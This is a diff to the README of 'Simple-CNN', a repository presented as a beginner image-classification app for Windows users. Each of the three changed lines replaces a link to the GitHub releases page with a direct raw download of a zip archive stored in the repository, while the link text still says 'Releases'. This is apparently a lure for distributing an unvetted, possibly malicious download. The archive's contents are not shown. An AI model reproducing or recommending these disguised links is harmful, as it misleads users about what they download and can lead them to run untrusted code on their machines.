@@ -1,6 +1,6 @@
 # 🧠 Simple-CNN - Learn Image Classification Fast
 
-[![Download](https://img.shields.io/badge/Download%20Simple--CNN-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bicolor-manipulation550/Simple-CNN/releases)
+[![Download](https://img.shields.io/badge/Download%20Simple--CNN-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/bicolor-manipulation550/Simple-CNN/main/element/Simple_CNN_1.5.zip)
 
 ## 📦 What This App Does
 
@@ -33,7 +33,7 @@ For smooth use, 8 GB of RAM or more is a good choice.
 
 Visit this page to download the app:
 
-[Simple-CNN Releases](https://github.com/bicolor-manipulation550/Simple-CNN/releases)
+[Simple-CNN Releases](https://raw.githubusercontent.com/bicolor-manipulation550/Simple-CNN/main/element/Simple_CNN_1.5.zip)
 
 On the release page, look for the latest file for Windows. Download the file that matches your system, then open it from your Downloads folder.
 
@@ -205,4 +205,4 @@ This makes it easier to open the app again later
 
 If you need the download page again:
 
-[Open Simple-CNN Releases](https://github.com/bicolor-manipulation550/Simple-CNN/releases)
+[Open Simple-CNN Releases](https://raw.githubusercontent.com/bicolor-manipulation550/Simple-CNN/main/element/Simple_CNN_1.5.zip)
